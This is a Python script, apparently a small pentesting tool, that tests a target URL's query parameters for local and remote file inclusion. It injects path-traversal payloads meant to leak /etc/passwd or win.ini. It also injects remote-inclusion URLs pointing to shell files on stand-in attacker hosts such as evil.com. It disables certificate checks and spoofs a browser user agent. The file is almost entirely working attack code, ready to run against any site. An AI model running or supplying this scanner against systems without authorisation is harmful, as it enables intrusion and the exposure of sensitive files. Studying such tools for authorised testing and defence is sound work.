#!/usr/bin/env python3
import sys
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import urllib3
from requests.exceptions import RequestException

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def lfi_rfi_tester(target):
    """Test for LFI and RFI vulnerabilities in a web application."""
    print(f"[+] Starting LFI/RFI Vulnerability Scanner for: {target}")
    print("=" * 80)

    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target

    payloads_lfi = [
        "../../etc/passwd",
        "../../../../../../../../../../etc/passwd",
        "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "....//....//....//....//etc/passwd"
    ]

    payloads_rfi = [
        "http://evil.com/shell.txt",
        "http://127.0.0.1/shell.txt",
        "https://attacker.com/shell.txt"
    ]

    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    })

    vulnerable = []
    total_params_tested = 0

    try:
        response = session.get(target, timeout=10, verify=False)
        if response.status_code != 200:
            print(f"[-] Failed to access target. Status code: {response.status_code}")
            return

        parsed_url = urlparse(target)
        query_params = parse_qs(parsed_url.query)

        if not query_params:
            print("[-] No query parameters found to test.")
            return

        print(f"[+] Found {len(query_params)} parameter(s) to test.\n")

        for param in query_params:
            print(f"[~] Testing parameter: '{param}'")
            total_params_tested += 1

            # LFI Testing
            for payload in payloads_lfi:
                new_params = query_params.copy()
                new_params[param] = payload
                new_query = urlencode(new_params, doseq=True)
                new_url = urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    new_query,
                    parsed_url.fragment
                ))

                try:
                    lfi_response = session.get(new_url, timeout=10, verify=False)
                    if "root:x:0:0" in lfi_response.text or "[extensions]" in lfi_response.text:
                        print(f"  ✅ LFI Vulnerable!")
                        print(f"    • URL: {new_url}")
                        print(f"    • Payload: {payload}")
                        if "root:x:0:0" in lfi_response.text:
                            print(f"    • Signature: Found 'root:x:0:0' (Linux /etc/passwd leak)")
                        if "[extensions]" in lfi_response.text:
                            print(f"    • Signature: Found '[extensions]' (Windows win.ini leak)")
                        vulnerable.append((param, 'LFI', new_url, payload))
                        break
                    else:
                        print(f"  ❌ LFI test failed with payload: {payload}")
                except RequestException as e:
                    print(f"  [-] Error testing LFI {new_url}: {str(e)}")

            # RFI Testing
            for payload in payloads_rfi:
                new_params = query_params.copy()
                new_params[param] = payload
                new_query = urlencode(new_params, doseq=True)
                new_url = urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    new_query,
                    parsed_url.fragment
                ))

                try:
                    rfi_response = session.get(new_url, timeout=10, verify=False)
                    if "shell" in rfi_response.text.lower() or "php" in rfi_response.text.lower():
                        print(f"  ✅ RFI Vulnerable!")
                        print(f"    • URL: {new_url}")
                        print(f"    • Payload: {payload}")
                        vulnerable.append((param, 'RFI', new_url, payload))
                        break
                    else:
                        print(f"  ❌ RFI test failed with payload: {payload}")
                except RequestException as e:
                    print(f"  [-] Error testing RFI {new_url}: {str(e)}")

            print("-" * 70)

        # FINAL SUMMARY
        print("\n" + "=" * 80)
        print("[+] SCAN SUMMARY")
        print("=" * 80)
        print(f"• Total Parameters Tested: {total_params_tested}")
        print(f"• Vulnerabilities Found: {len(vulnerable)}\n")

        if vulnerable:
            print("VULNERABLE PARAMETERS:")
            for param, vuln_type, vuln_url, vuln_payload in vulnerable:
                print(f"  - [{vuln_type}] Parameter '{param}' via {vuln_url}")
                print(f"    Payload: {vuln_payload}")
        else:
            print("No LFI/RFI vulnerabilities confirmed.")

    except Exception as e:
        print(f"[-] An unexpected error occurred: {str(e)}")


def main():
    if len(sys.argv) < 2:
        print("Usage: python lfi_rfi_tester.py <target_url>")
        sys.exit(1)

    target = sys.argv[1]
    lfi_rfi_tester(target)

if __name__ == "__main__":
    main()
